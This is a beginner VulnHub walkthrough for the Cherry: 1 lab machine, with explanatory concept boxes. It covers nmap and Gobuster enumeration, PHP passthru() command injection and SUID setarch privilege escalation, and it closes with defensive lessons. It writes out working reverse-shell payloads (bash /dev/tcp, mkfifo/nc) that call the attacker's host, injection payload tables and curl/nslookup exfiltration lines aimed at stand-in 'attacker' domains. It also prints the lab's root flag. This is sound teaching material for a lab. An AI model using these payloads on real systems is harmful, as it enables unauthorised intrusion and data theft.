# Cherry: 1 — Intermediate VulnHub Walkthrough

A beginner-friendly, step-by-step walkthrough of the **Cherry: 1** boot2root challenge
from VulnHub. Every command is explained and every output is shown as you would see it.
Small details **vary by build**, so if a version number or filename differs slightly on
your machine, that is normal.

| Field | Value |
|---|---|
| **Machine** | Cherry: 1 |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | SunCSR Team |
| **Released** | 14 September 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/cherry-1,552/ |
| **Download** | https://vulnhub.com/entry/cherry-1,552/#download |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Ubuntu Linux 20.04 (Focal) |

> **Why it works:** Cherry chains two common mistakes: a PHP script that executes
> attacker-supplied operating-system commands, and a file with the SUID bit set that
> should never carry it. Each of these alone is enough to hand over root.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this walkthrough you will have practised:

- **Host discovery** — finding the target on your lab network.
- **Nmap scanning** — spotting multiple web servers on non-standard ports.
- **Web directory brute forcing** — finding hidden files with Gobuster/DirBuster.
- **Command injection** — exploiting a PHP `passthru()` call for remote code execution.
- **Reverse shells** — catching a shell on your Kali listener.
- **SUID privilege escalation** — abusing a SUID binary (`setarch`) to become root.

No prior experience is required. Follow along, read the outputs, and understand *why*
each step works.

> **Note on networking:** This VM was built for VMware and, on VirtualBox, the network
> interface name may need adjusting before it gets an IP address. See the VulnHub entry
> comments / author notes if the box does not appear on the network.

---

## 1. Reconnaissance — finding the target

Kali is `192.168.56.10`; we need the target's address on the host-only network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Discover live hosts:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.

   IP            At MAC Address     Count   Len   MAC Vendor
 -------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00     1    60   PCS Systemtechnik
 192.168.56.10   0a:00:27:00:00:09     1    60   PCS Systemtechnik
 192.168.56.101  08:00:27:8b:4d:1a     2    96   PCS Systemtechnik
```

> **Why it works:** `netdiscover` sends ARP probes to every address in the subnet. Any
> host that replies is alive. The target is **`192.168.56.101`**.

![Finding the target with netdiscover](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Nmap service scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -p- -sC -sV 192.168.56.101 -oN cherry_first_scan.txt
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00025s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cherry
7755/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Cherry
33060/tcp open  mysqlx?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:** `-p-` scans all ports, `-sV` identifies versions, and `-sC` runs
> default scripts. Notice **two web servers**: nginx on port 80 and Apache on port 7755.
> Both show a page titled "Cherry".

### 2.2 Look at both web servers

Open `http://192.168.56.101/` and `http://192.168.56.101:7755/` in a browser.

Both show the same simple landing page. That tells us the more interesting content is
probably behind a hidden path — so we brute force directories.

### 2.3 Directory brute forcing


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101:7755 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x html,php,txt
```

```text
/icons/            (Status: 301)
/backup/           (Status: 301)
/backup/command.php (Status: 200)
/backup/latest.tar.gz (Status: 200)
/backup/master.zip.bak (Status: 200)
/backup/master.zip (Status: 200)
/index.html        (Status: 200)
/info.php          (Status: 200)
/server-status     (Status: 403)
```

> **Why it works:** Gobuster requests every word in the wordlist as a path and reports
> the HTTP status. `200`/`301` means the path exists. We found a `/backup/` directory
> containing `command.php`.

If you prefer a graphical tool, DirBuster does the same job:

```bash
dirbuster -u http://192.168.56.101:7755 -l /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 -e html,htm,php,txt -v
```

![Gobuster discovering the /backup directory](images/02-gobuster.png)

---

## 3. Foothold

### 3.1 Inspect command.php

On port 80 the same file downloads instead of running; on port 7755 Apache executes PHP.
Fetch it and read the source:

```bash
curl http://192.168.56.101:7755/backup/command.php
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Backup</title>
</head>
<body>
<!-- </?php echo passthru($_GET['backup']); ?/> -->
</body>
</html>
```

> **Why it works:** The comment reveals the real logic: the script calls PHP's
> `passthru()` with the value of the `backup` GET parameter and prints the result. That
> means **any OS command we put in `backup=` runs on the server** — classic command
> injection / remote code execution.

### 3.2 Prove command execution

```bash
curl "http://192.168.56.101:7755/backup/command.php?backup=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The `id` command printed the web server's user, `www-data`. Commands
> run with the privileges of the web server process.

### 3.3 Get a reverse shell

Start a listener on Kali:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 4444
```

Now trigger the payload through the vulnerable parameter (URL-encoded):

```bash
curl "http://192.168.56.101:7755/backup/command.php?backup=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.10%204444%20%3E%2Ftmp%2Ff"
```

```text
listening on [any] 4444 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 41234
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The `mkfifo` + `nc` trick creates a named pipe and connects the
> server's shell back to our listener. The `%20` etc. are just URL-encoded spaces and
> special characters so the browser/curl passes them intact.

### 3.4 Upgrade to an interactive shell


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```text
www-data@cherry:/var/www/html/backup$
```

> **Why it works:** `pty.spawn` gives us a proper pseudo-terminal so interactive
> commands behave normally.

![Reverse shell as www-data](images/03-reverse-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Search for SUID binaries


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/setarch
...
```

> **Why it works:** The `find` command lists files with the **SUID** bit set. A SUID
> binary runs with the privileges of its owner (here, root) — even when a low-privileged
> user starts it. `/usr/bin/setarch` is unusual and stands out.

### 4.2 Confirm the setarch permissions

```bash
ls -alh /usr/bin/setarch
```

```text
-rwsr-sr-x 1 root root 27K Apr  2  2020 /usr/bin/setarch
```

> **Why it works:** The `s` in `-rwsr-sr-x` is the SUID bit. Because `setarch` is owned
> by root and is SUID, it can be abused to launch a shell as root.

### 4.3 Exploit setarch (GTFOBins)


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
setarch $(arch) /bin/sh -p
```

```text
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

> **Why it works:** `setarch` re-runs a program under a given architecture. Because it is
> SUID-root, the `/bin/sh` it launches runs with effective UID 0. The `-p` flag tells
> `sh` to keep the elevated privileges instead of dropping them. This exact technique is
> documented on GTFOBins.

### 4.4 Read the root flag

```bash
cd /root
ls
cat proof.txt
```

```text
Sun_CSR_TEAM.af6d45da1f1181347b9e2139f23c6a5b
```

![Root shell and root flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Why it is dangerous |
|---|---|---|---|
| 1 | OS command injection | `command.php` via PHP `passthru()` | Attacker-supplied input runs as OS commands |
| 2 | Sensitive files exposed | `/backup/` directory listing | Leaks source code and archives |
| 3 | PHP source disclosure | Same file readable/executed on two ports | Reveals the injection point |
| 4 | SUID binary abuse | `/usr/bin/setarch` set SUID-root | Lets any user spawn a root shell |

---

## 6. Defensive lessons (blue team)

- **Never pass user input to shell execution.** Replace `passthru()`/`exec()`/`system()`
  with safe APIs, and validate/allow-list all inputs.
- **Disable directory listing and remove backup archives** from web roots. Backups often
  contain source code, credentials, and configuration.
- **Avoid running PHP on stray ports.** Serving the same code with different server
  configs can expose behaviour (like source download) you did not intend.
- **Audit SUID binaries.** Run `find / -perm -u=s -type f` regularly and remove the SUID
  bit from anything that does not strictly need it — especially shells and setuid
  launchers such as `setarch`.
- **Run web servers as an unprivileged user** (already true here) and apply OS hardening
  such as `noexec` on writable web directories.
- **Patch and version-check services** and keep the attack surface minimal.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub — Cherry: 1 entry: https://vulnhub.com/entry/cherry-1,552/
- GTFOBins — `setarch`: https://gtfobins.github.io/gtfobins/setarch/
- PHP `passthru()` manual: https://www.php.net/manual/en/function.passthru.php
- OWASP — Command Injection:
  https://owasp.org/www-community/attacks/Command_Injection
- OWASP — OS Command Injection Defense Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- GTFO / SUID background: https://gtfobins.github.io/

---

## 8. Screenshot checklist

Capture these screens as you go so your writeup is complete:

- [ ] `images/01-netdiscover.png` — host discovery showing `192.168.56.101`
- [ ] `images/02-gobuster.png` — Gobuster finding `/backup/` and `command.php`
- [ ] `images/03-reverse-shell.png` — reverse shell as `www-data` (`id`)
- [ ] `images/04-root-flag.png` — root shell plus `cat /root/proof.txt`
- [ ] `images/05-command-injection.png` — the `?backup=id` proof of RCE
- [ ] `images/06-suid-find.png` — `find` output showing `/usr/bin/setarch`
- [ ] `images/07-proof.png` — final combined proof screenshot

> **Why it works:** A clear screenshot trail proves reproducibility and is the same kind
> of evidence a professional penetration-test report would include.
